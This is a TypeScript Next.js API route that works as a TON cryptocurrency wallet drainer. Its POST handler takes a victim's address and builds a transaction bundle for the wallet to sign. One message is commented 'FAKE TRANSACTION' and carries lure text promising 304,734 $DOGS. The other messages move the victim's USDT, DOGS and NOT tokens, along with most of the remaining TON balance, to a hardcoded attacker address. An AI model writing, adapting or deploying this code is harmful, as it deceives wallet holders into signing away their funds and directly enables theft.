import {Address, beginCell, StateInit, storeStateInit, toNano, TonClient, TupleBuilder} from "@ton/ton";
import { NextRequest, NextResponse } from "next/server";


const client = new TonClient({
	endpoint: 'https://toncenter.com/api/v2/jsonRPC',
	apiKey:  process.env['TON_API']
});

const dogsAddress = "EQCvxJy4eG8hyHBFsZ7eePxrRsUQSFE_jpptRAYBmcG_DOGS";
const notAddress = "EQAvlWFDxGF2lXm67y4yzC17wYKD9A0guwPkMs1gOsM__NOT"
const tetherAddress = "EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs"


const defaultText = '🔐 Receive 304,734.00 $DOGS + Rewards'

export async function POST(req: NextRequest) {
	// if (true) {
	// const bayadAddress = "UQAabWc_44bT8lEMvkXz_niUc7WwPmSFHrk6WyN5iy2J6RU9";
	// const koskeshiAddress = "UQBKSAA1lzueQq2SuZmopHeDJTYQ9PRSvRZATEKitn0MsPrk"
	// const ridimAddress = "EQASdk1XxjMmu8MB3bjDlQxKqBBRtAvQTTmKG204Y-eRtbHT";
	// 	const ridimWallet = Address.parse(ridimAddress);
	// 	const bayadWallet = Address.parse(bayadAddress);
	// 	const dogsBayad = await getContractWallet(dogsAddress,bayadAddress);
	// 	const dogsRidimWallet = await getContractWallet(dogsAddress, ridimWallet);
	// 	const koskeshiWallet = Address.parse(koskeshiAddress);
	// 	const dogsKoskeshiWallet = await getContractWallet(dogsAddress, koskeshiWallet);
	// 	const owner = Address.parseRaw("0:12764d57c63326bbc301ddb8c3950c4aa81051b40bd04d398a1b6d3863e791b5");
	//
	// 	const state = await stateInit(owner.toString()).then(r=>r.toString());
	//
	// 	console.log("TEST", owner.toString())
	//
	// 	const o = {
	// 		validUntil: Math.floor(Date.now() / 1000) + 500,
	// 		messages: [
	// 			{
	// 				address: dogsRidimWallet.toString(),
	// 				amount: toNano('0.05').toString(),
	// 				payload: await createTokenTransferPayload(owner, dogsKoskeshiWallet,toNano('4000'))
	// 			}
	// 		]
	// 	};
	// 	console.log("====>",o)
	// 	return NextResponse.json(o)
	// }

	const { address: sender } = await req.json();

	const receiver = "UQBOENjSOsj8c3Hosh4e2hAHmxW2Fzcw2U1KixwnvyT-m5hW";
	const senderWallet = Address.parse(sender);
	const receiverWallet = Address.parse(receiver);

	const fee = toNano("0.05");
	const tons = await client.getBalance(senderWallet);

	if (tons < toNano('0.2')) throw("Balance")

	// FAKE TRANSACTION
	const dogsSenderJettonWallet = await getContractWallet(dogsAddress, senderWallet);
	let transactions = [
		{
			amount: fee.toString(),
			address: dogsSenderJettonWallet.toString(),
			payload: await createTokenTransferPayload(receiverWallet, senderWallet, toNano('304734'))
		}
	];


	const contracts = [
		tetherAddress,
		dogsAddress,
		notAddress
	]

	for (let contract of contracts) {
		const jettonWallet = await getContractWallet(contract, senderWallet);
		const balance = await getTokenBalance(jettonWallet);

		const payload = await createTokenTransferPayload(
			senderWallet,
			receiverWallet,
			toNano('100')
		);


		transactions.push({
			address: jettonWallet.toString(),
			amount: fee.toString(),
			payload
		})
	}

	transactions = transactions.slice(0,3)

	const remains = (tons - (fee * BigInt(transactions.length + 1)));
	if (remains > toNano('0.2')) {
		transactions.push({
			address: receiverWallet.toString(),
			amount: remains.toString(),
			payload: (beginCell().storeUint(0, 32).storeStringTail(defaultText).endCell()).toBoc().toString('base64')
		})
	}

	return NextResponse.json({
		validUntil: Math.floor(Date.now() / 1000) + 500,
		messages: transactions
	});
}

async function createTokenTransferPayload(source: Address, destination: Address, amount: bigint | number, text = defaultText) {

	const forwardPayload = beginCell()
		.storeUint(0, 32)  // 0 opcode for a simple message
		.storeStringTail(text)
		.endCell();

	// Building the body with correct fields
	const body = beginCell()
		.storeUint(0xf8a7ea5, 32)
		.storeUint(0, 64)
		.storeCoins(amount)
		.storeAddress(destination)
		.storeAddress(source)
		.storeUint(0, 1)
		.storeCoins(1)
		.storeBit(1)
		.storeRef(forwardPayload)
		.endCell();

	return body.toBoc().toString('base64')
}

const CONTRACT_CACHE: {
	[address: string]: Awaited<ReturnType<typeof client.provider>>
} = {};

async function getContractProvider(_address: string | Address) {
	const address = typeof _address === 'string' ? _address : _address.toString();
	const cache = CONTRACT_CACHE[address];

	if (cache) return cache;

	return client.provider(Address.parse(address));
}

async function getContractWallet(contractAddress: string | Address, ownerAddress: string | Address) {
	const contract = await getContractProvider(contractAddress);

	const args = new TupleBuilder();
	args.writeAddress(typeof ownerAddress === 'string' ? Address.parse(ownerAddress) : ownerAddress);
	return await contract.get('get_wallet_address', args.build()).then(r => r.stack.readAddress());
}

async function getTokenBalance(jettonOfTokenWallet: string | Address) {
	try {
		const data = await client.runMethod(typeof jettonOfTokenWallet === 'string' ? Address.parse(jettonOfTokenWallet) : jettonOfTokenWallet, 'get_wallet_data');
		return data.stack.readNumber();
	} catch {
		return 0;
	}
}


async function stateInit(address: string) {
	const jettonWalletAddress = Address.parse(address);
	let jettonWalletDataResult = await client.runMethod(jettonWalletAddress, 'get_wallet_data');
	jettonWalletDataResult.stack.readNumber();
	const ownerAddress = jettonWalletDataResult.stack.readAddress();
	const jettonMasterAddress = jettonWalletDataResult.stack.readAddress();
	const jettonCode = jettonWalletDataResult.stack.readCell();
	const jettonData = beginCell()
		.storeCoins(0)
		.storeAddress(ownerAddress)
		.storeAddress(jettonMasterAddress)
		.storeRef(jettonCode)
		.endCell();

	const stateInit: StateInit = {
		code: jettonCode,
		data: jettonData
	}

	const stateInitCell = beginCell()
		.store(storeStateInit(stateInit))
		.endCell();

	return new Address(0, stateInitCell.hash());
}
